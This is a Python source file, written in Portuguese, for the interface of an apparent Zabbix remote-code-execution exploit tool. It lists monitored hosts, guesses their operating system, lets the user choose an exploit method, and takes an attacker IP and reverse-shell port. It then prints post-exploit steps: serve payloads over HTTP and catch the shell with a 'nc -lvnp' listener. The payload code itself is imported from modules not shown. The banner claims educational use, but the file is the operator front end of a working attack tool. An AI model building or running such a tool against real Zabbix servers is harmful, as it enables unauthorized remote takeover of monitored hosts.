"""
Módulo de interface de usuário para o Zabbix RCE Exploit
Gerencia toda interação com o usuário e exibição de informações
"""

import sys
from typing import List, Dict, Tuple, Optional
from .os_detector import OSDetector


class UserInterface:
    """Interface de usuário para o exploit"""
    
    def __init__(self, api_client, exploit_manager, payload_generator):
        self.api_client = api_client
        self.exploit_manager = exploit_manager
        self.payload_generator = payload_generator
        self.os_detector = OSDetector()
    
    def display_banner(self):
        """Exibe banner da aplicação"""
        banner = """
╔══════════════════════════════════════════════════════════════╗
║                    ZABBIX RCE EXPLOIT v2.0                  ║
║                                                              ║
║  🎯 Exploit de Execução Remota de Código para Zabbix Agent  ║
║  📚 Versão Educacional - Use apenas em ambientes autorizados ║
║                                                              ║
║  Autor: Zabbix RCE Team                                      ║
║  Versão: 2.0.0                                               ║
╚══════════════════════════════════════════════════════════════╝
        """
        print(banner)
        
        # Aviso de responsabilidade
        print("⚠️  AVISO IMPORTANTE:")
        print("   Esta ferramenta é destinada APENAS para fins educacionais")
        print("   e testes de segurança autorizados. O uso inadequado pode")
        print("   violar leis e políticas. Use sob sua própria responsabilidade.\n")
    
    def main_menu(self) -> str:
        """Exibe menu principal e retorna escolha do usuário"""
        print("\n" + "="*60)
        print("📋 MENU PRINCIPAL")
        print("="*60)
        print("1. 🚀 Implantar Exploit")
        print("2. 📋 Listar Hosts")
        print("3. 🧹 Limpar Exploits")
        print("4. 🔍 Testar Conexão")
        print("5. ⚙️  Exibir Configurações")
        print("6. 🚪 Sair")
        print("="*60)
        
        while True:
            try:
                choice = input("Escolha uma opção (1-6): ").strip()
                if choice in ['1', '2', '3', '4', '5', '6']:
                    return choice
                else:
                    print("❌ Opção inválida. Digite um número de 1 a 6.")
            except KeyboardInterrupt:
                print("\n")
                return '6'
    
    def display_hosts_table(self, hosts: List[Dict]):
        """Exibe tabela de hosts disponíveis"""
        if not hosts:
            self.display_warning("Nenhum host encontrado")
            return
        
        print("\n" + "="*100)
        print("📋 HOSTS DISPONÍVEIS")
        print("="*100)
        print(f"{'ID':<3} {'Host':<20} {'Nome':<25} {'SO Detectado':<12} {'Interfaces':<15} {'Status'}")
        print("-"*100)
        
        for i, host in enumerate(hosts, 1):
            host_name = host.get('host', 'N/A')
            display_name = host.get('name', 'N/A')
            
            # Detecta sistema operacional
            detected_os = self.os_detector.detect_os(host)
            os_display = f"{detected_os['os_type']} ({detected_os['confidence']:.0%})"
            
            # Conta interfaces
            interfaces_count = len(host.get('interfaces', []))
            interfaces_display = f"{interfaces_count} interface(s)"
            
            # Status do host
            status = "Ativo" if host.get('status') == '0' else "Inativo"
            
            # Trunca strings longas
            if len(host_name) > 19:
                host_name = host_name[:16] + "..."
            if len(display_name) > 24:
                display_name = display_name[:21] + "..."
            
            print(f"{i:<3} {host_name:<20} {display_name:<25} {os_display:<12} {interfaces_display:<15} {status}")
        
        print("="*100)
    
    def select_host(self, hosts: List[Dict]) -> Optional[Dict]:
        """Permite usuário selecionar um host"""
        while True:
            try:
                print(f"\n📍 Selecione um host (1-{len(hosts)}) ou 'c' para cancelar:")
                choice = input("Opção: ").strip().lower()
                
                if choice == 'c':
                    return None
                
                index = int(choice) - 1
                if 0 <= index < len(hosts):
                    selected_host = hosts[index]
                    print(f"✅ Host selecionado: {selected_host['host']}")
                    return selected_host
                else:
                    print(f"❌ Opção inválida. Digite um número de 1 a {len(hosts)}")
                    
            except ValueError:
                print("❌ Digite um número válido ou 'c' para cancelar")
            except KeyboardInterrupt:
                return None
    
    def select_interface(self, host: Dict) -> Optional[Tuple[Dict, int]]:
        """Permite usuário selecionar uma interface do host"""
        interfaces = host.get('interfaces', [])
        
        if not interfaces:
            self.display_error(f"Host '{host['host']}' não possui interfaces disponíveis")
            return None
        
        if len(interfaces) == 1:
            interface = interfaces[0]
            print(f"✅ Interface única selecionada: {interface.get('ip', 'N/A')}:{interface.get('port', 'N/A')}")
            return interface, 0
        
        print(f"\n🔌 Interfaces disponíveis para '{host['host']}':")
        print("-"*60)
        
        for i, interface in enumerate(interfaces, 1):
            ip = interface.get('ip', 'N/A')
            port = interface.get('port', 'N/A')
            interface_type = interface.get('type', 'N/A')
            print(f"{i}. IP: {ip:<15} Porta: {port:<6} Tipo: {interface_type}")
        
        while True:
            try:
                choice = input(f"\nSelecione uma interface (1-{len(interfaces)}) ou 'c' para cancelar: ").strip().lower()
                
                if choice == 'c':
                    return None
                
                index = int(choice) - 1
                if 0 <= index < len(interfaces):
                    interface = interfaces[index]
                    print(f"✅ Interface selecionada: {interface.get('ip', 'N/A')}:{interface.get('port', 'N/A')}")
                    return interface, index
                else:
                    print(f"❌ Opção inválida. Digite um número de 1 a {len(interfaces)}")
                    
            except ValueError:
                print("❌ Digite um número válido ou 'c' para cancelar")
            except KeyboardInterrupt:
                return None
    
    def select_os_type(self, host: Dict) -> Optional[str]:
        """Permite usuário selecionar/confirmar sistema operacional"""
        # Detecta automaticamente
        detection_result = self.os_detector.detect_os(host)
        detected_os = detection_result['os_type']
        confidence = detection_result['confidence']
        
        print(f"\n🔍 Detecção de Sistema Operacional:")
        print(f"   Host: {host['host']}")
        print(f"   SO Detectado: {detected_os.upper()}")
        print(f"   Confiança: {confidence:.0%}")
        
        if confidence >= 0.7:
            print(f"✅ Detecção com alta confiança")
        else:
            print(f"⚠️  Detecção com baixa confiança - recomenda-se verificação manual")
        
        print("\nOpções:")
        print("1. 🐧 Linux")
        print("2. 🖥️  Windows") 
        print(f"3. ✅ Usar detecção automática ({detected_os.upper()})")
        print("4. ❌ Cancelar")
        
        while True:
            try:
                choice = input("Escolha o sistema operacional (1-4): ").strip()
                
                if choice == '1':
                    return 'linux'
                elif choice == '2':
                    return 'windows'
                elif choice == '3':
                    return detected_os.lower()
                elif choice == '4':
                    return None
                else:
                    print("❌ Opção inválida. Digite um número de 1 a 4.")
                    
            except KeyboardInterrupt:
                return None
    
    def select_exploit_method(self, os_type: str) -> Optional[str]:
        """Permite usuário selecionar método de exploit"""
        methods = self.payload_generator.get_available_methods(os_type)
        
        if not methods:
            self.display_error(f"Nenhum método disponível para {os_type}")
            return None
        
        print(f"\n⚡ Métodos de Exploit para {os_type.upper()}:")
        print("-"*60)
        
        for i, method in enumerate(methods, 1):
            description = self.payload_generator.get_method_description(os_type, method)
            print(f"{i}. {method.upper()}")
            print(f"   {description}")
            print()
        
        print(f"{len(methods) + 1}. ❌ Cancelar")
        
        while True:
            try:
                choice = input(f"Selecione um método (1-{len(methods) + 1}): ").strip()
                choice_int = int(choice)
                
                if 1 <= choice_int <= len(methods):
                    selected_method = methods[choice_int - 1]
                    print(f"✅ Método selecionado: {selected_method.upper()}")
                    return selected_method
                elif choice_int == len(methods) + 1:
                    return None
                else:
                    print(f"❌ Opção inválida. Digite um número de 1 a {len(methods) + 1}")
                    
            except ValueError:
                print("❌ Digite um número válido")
            except KeyboardInterrupt:
                return None
    
    def get_exploit_parameters(self, default_ip: str) -> Optional[Tuple[str, int]]:
        """Obtém parâmetros do exploit do usuário"""
        print(f"\n⚙️  Configuração de Parâmetros:")
        
        # IP do atacante
        while True:
            ip_input = input(f"IP do atacante [{default_ip}]: ").strip()
            ip_shell = ip_input if ip_input else default_ip
            
            # Validação básica de IP
            if self._validate_ip(ip_shell):
                break
            else:
                print("❌ IP inválido. Digite um endereço IP válido.")
        
        # Porta para reverse shell
        while True:
            try:
                port_input = input("Porta para reverse shell [4444]: ").strip()
                port = int(port_input) if port_input else 4444
                
                if 1 <= port <= 65535:
                    break
                else:
                    print("❌ Porta inválida. Digite um número de 1 a 65535.")
                    
            except ValueError:
                print("❌ Digite um número válido para a porta.")
            except KeyboardInterrupt:
                return None
        
        return ip_shell, port
    
    def confirm_exploit_deployment(self, host: Dict, os_type: str, method: str, ip_shell: str, port: int) -> bool:
        """Solicita confirmação final antes de implantar exploit"""
        print("\n" + "="*60)
        print("🚨 CONFIRMAÇÃO DE IMPLANTAÇÃO")
        print("="*60)
        print(f"Host Alvo: {host['host']}")
        print(f"Sistema Operacional: {os_type.upper()}")
        print(f"Método: {method.upper()}")
        print(f"IP Atacante: {ip_shell}")
        print(f"Porta: {port}")
        print("="*60)
        
        print("\n⚠️  ATENÇÃO:")
        print("   - Certifique-se de ter autorização para este teste")
        print("   - Prepare seu listener antes de confirmar")
        print("   - Esta ação criará itens no Zabbix")
        
        while True:
            try:
                confirm = input("\n🚀 Confirma implantação do exploit? (s/n): ").strip().lower()
                if confirm in ['s', 'sim', 'y', 'yes']:
                    return True
                elif confirm in ['n', 'nao', 'não', 'no']:
                    return False
                else:
                    print("❌ Digite 's' para sim ou 'n' para não")
            except KeyboardInterrupt:
                return False
    
    def display_post_exploit_instructions(self, os_type: str, method: str, ip_shell: str, port: int):
        """Exibe instruções pós-exploit"""
        print("\n" + "="*70)
        print("✅ EXPLOIT IMPLANTADO COM SUCESSO!")
        print("="*70)
        
        print("\n📋 Próximos Passos:")
        
        if os_type.lower() == 'windows' and method == 'powershell':
            print(f"1. 🌐 Inicie um servidor HTTP na pasta 'payloads':")
            print(f"   cd payloads")
            print(f"   python -m http.server 8000")
            print()
            print(f"2. 🎧 Configure seu listener:")
            print(f"   nc -lvnp {port}")
            print()
            print(f"3. ⏱️  Aguarde conexão em aproximadamente 60 segundos")
            
        else:
            print(f"1. 🎧 Configure seu listener:")
            print(f"   nc -lvnp {port}")
            print()
            print(f"2. ⏱️  Aguarde conexão em aproximadamente 60 segundos")
        
        print("\n🧹 Limpeza:")
        print("   Use a opção 3 do menu principal para remover itens criados")
        
        print("\n⚠️  Lembre-se:")
        print("   - Monitore seus logs de segurança")
        print("   - Remova itens após o teste")
        print("   - Documente os resultados")
        
        print("="*70)
    
    def display_success(self, message: str):
        """Exibe mensagem de sucesso"""
        print(f"✅ {message}")
    
    def display_error(self, message: str):
        """Exibe mensagem de erro"""
        print(f"❌ {message}")
    
    def display_warning(self, message: str):
        """Exibe mensagem de aviso"""
        print(f"⚠️  {message}")
    
    def display_info(self, message: str):
        """Exibe mensagem informativa"""
        print(f"ℹ️  {message}")
    
    def pause_for_user(self, message: str = "\nPressione Enter para continuar..."):
        """Pausa execução aguardando usuário"""
        try:
            input(message)
        except KeyboardInterrupt:
            pass
    
    def _validate_ip(self, ip: str) -> bool:
        """Validação básica de endereço IP"""
        parts = ip.split('.')
        if len(parts) != 4:
            return False
        
        try:
            for part in parts:
                num = int(part)
                if not 0 <= num <= 255:
                    return False
            return True
        except ValueError:
            return False